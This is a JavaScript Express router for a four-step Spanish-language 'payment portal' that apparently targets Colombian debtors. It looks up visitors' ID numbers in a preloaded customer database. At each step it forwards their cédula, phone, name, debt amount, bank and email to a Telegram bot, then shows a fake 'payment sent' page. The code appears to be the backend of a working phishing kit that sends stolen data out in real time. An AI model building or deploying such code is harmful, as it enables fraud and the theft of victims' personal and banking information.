'use strict';

const express = require('express');
const router  = express.Router();
const { buscarPorCedula } = require('../data/loader');
const { enviar, horaActual, registrar, completar } = require('../utils/telegram');

// Formatea un número como moneda colombiana: $1.234.567
function formatCOP(val) {
  const n = parseInt(String(val).replace(/[^0-9]/g, ''), 10);
  if (!val || isNaN(n) || n <= 0) return val || '';
  return '$' + n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');
}

// ── Paso 1 ────────────────────────────────────────────────────────────────────

router.get('/', (req, res) => {
  res.render('paso1', { title: 'Portal de pago — Paso 1 de 4', paso: 1 });
});

router.post('/paso1', (req, res) => {
  const { cedula, telefono } = req.body;
  if (!cedula || !telefono) {
    return res.render('paso1', {
      title: 'Portal de pago — Paso 1 de 4',
      paso: 1,
      error: 'Por favor completa todos los campos.',
    });
  }

  registrar(cedula, 'Paso 1', cedula);
  enviar(
    `📲 <b>Nuevo cliente en el portal</b>\n` +
    `👤 Cédula: <code>${cedula}</code>\n` +
    `📱 Teléfono: ${telefono}\n` +
    `🕐 ${horaActual()}`
  );

  res.redirect(`/paso2?cedula=${encodeURIComponent(cedula)}`);
});

// ── Paso 2 ────────────────────────────────────────────────────────────────────

router.get('/paso2', (req, res) => {
  const cedula      = req.query.cedula || '';
  const cliente     = buscarPorCedula(cedula);
  const nombre      = cliente ? String(cliente['NOMBRE']     || '').trim() : '';
  const numProducto = cliente ? String(cliente['OBLIGACION'] || '').trim() : '';
  const valorPagar  = cliente ? String(Math.round(Number(cliente['SALDO TOTAL']) || 0)) : '';

  registrar(cedula, 'Paso 2', nombre || cedula);
  enviar(
    `📋 <b>Paso 2 — Datos del cliente</b>\n` +
    `👤 ${nombre || '(no encontrado en BD)'}\n` +
    `🆔 Cédula: <code>${cedula}</code>\n` +
    `📄 Producto: ${numProducto || '—'}\n` +
    `💰 Valor a pagar: ${formatCOP(valorPagar) || '—'}\n` +
    `🟢 En línea\n` +
    `🕐 ${horaActual()}`
  );

  res.render('paso2', {
    title: 'Portal de pago — Paso 2 de 4',
    paso: 2,
    paso2activo: true,
    cedula,
    nombreCliente: nombre,
    numProducto,
    valorPagar,
  });
});

router.post('/paso2', (req, res) => {
  const { cedula, nombreCliente, numProducto, valorPagar, otroValor, terminos } = req.body;

  if (!nombreCliente || !numProducto || !valorPagar || !terminos) {
    return res.render('paso2', {
      title: 'Portal de pago — Paso 2 de 4',
      paso: 2,
      paso2activo: true,
      error: 'Por favor completa todos los campos y acepta los términos.',
      cedula, nombreCliente, numProducto, valorPagar, otroValor,
    });
  }

  registrar(cedula, 'Paso 3', nombreCliente);
  enviar(
    `✅ <b>Paso 2 completado</b>\n` +
    `👤 ${nombreCliente}\n` +
    `💰 Valor a pagar: ${formatCOP(valorPagar)}\n` +
    `💸 Valor con descuento: ${otroValor ? formatCOP(otroValor) : 'No indicado'}\n` +
    `➡️ Avanzó al Paso 3\n` +
    `🕐 ${horaActual()}`
  );

  const params = new URLSearchParams({ cedula, nombreCliente, numProducto, valorPagar, otroValor });
  res.redirect('/paso3?' + params.toString());
});

// ── Paso 3 ────────────────────────────────────────────────────────────────────

router.get('/paso3', (req, res) => {
  const cedula        = req.query.cedula        || '';
  const nombreCliente = req.query.nombreCliente || '';
  const numProducto   = req.query.numProducto   || '';
  const valorPagar    = req.query.valorPagar     || '';
  const otroValor     = req.query.otroValor      || '';

  registrar(cedula, 'Paso 3', nombreCliente);
  enviar(
    `🏦 <b>Paso 3 — Datos bancarios</b>\n` +
    `👤 ${nombreCliente}\n` +
    `🟢 En línea\n` +
    `🕐 ${horaActual()}`
  );

  res.render('paso3', {
    title: 'Portal de pago — Paso 3 de 4',
    paso: 3,
    paso2activo: true,
    paso3activo: true,
    cedula,
    nombreCliente,
    numProducto,
    valorPagar: formatCOP(valorPagar),
    otroValor:  formatCOP(otroValor),
  });
});

router.post('/paso3', (req, res) => {
  const { tipopersona, tipodoc, numdoc, banco,
          correo, cedula, nombreCliente,
          numProducto, valorPagar, otroValor } = req.body;

  if (!tipodoc || !numdoc || !banco || !correo) {
    return res.render('paso3', {
      title: 'Portal de pago — Paso 3 de 4',
      paso: 3,
      paso2activo: true,
      paso3activo: true,
      error: 'Por favor completa todos los campos obligatorios.',
      cedula, nombreCliente, numProducto, valorPagar, otroValor,
      numdoc, correo,
    });
  }

  completar(cedula);
  enviar(
    `🎉 <b>¡FLUJO COMPLETADO!</b>\n` +
    `👤 ${nombreCliente}\n` +
    `🆔 Cédula: <code>${cedula}</code>\n` +
    `📄 Producto: ${numProducto}\n` +
    `💰 Valor a pagar: ${formatCOP(valorPagar)}\n` +
    (otroValor ? `💸 Valor con descuento: ${formatCOP(otroValor)}\n` : '') +
    `🏦 Banco: ${banco}\n` +
    `📧 Correo: ${correo}\n` +
    `✅ Pago enviado\n` +
    `🕐 ${horaActual()}`
  );

  res.render('confirmacion', {
    title: '¡Pago enviado!',
    nombreCliente, numProducto,
    valorPagar: formatCOP(valorPagar),
    otroValor:  formatCOP(otroValor),
    banco, correo,
  });
});

module.exports = router;
